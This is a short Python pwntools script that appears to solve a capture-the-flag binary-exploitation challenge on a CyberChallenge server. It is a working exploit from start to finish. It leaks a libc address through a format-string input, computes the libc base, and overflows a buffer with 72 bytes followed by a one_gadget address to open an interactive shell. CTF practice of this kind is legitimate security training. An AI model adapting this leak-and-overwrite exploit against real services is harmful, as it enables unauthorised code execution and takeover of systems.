from pwn import *

REMOTE = False

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50230

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

libc = ELF("./libc.so.6")

printf_libc_offset = libc.symbols["printf"]
system_libc_offset = libc.symbols["system"]

one_gadget_offset = 0xeb5eb

conn.sendlineafter(b"> ", b"%27p")
leak = int(conn.recvline(keepends=False), 16)

# Vedi test.py per capire da dove arriva la parte dopo il -

libc_base = leak - (libc.symbols["_rtld_global"])
print(hex(libc_base))

one_gadget_address = libc_base + one_gadget_offset

conn.sendline(b"A" * 72 + p64(one_gadget_address))

conn.interactive()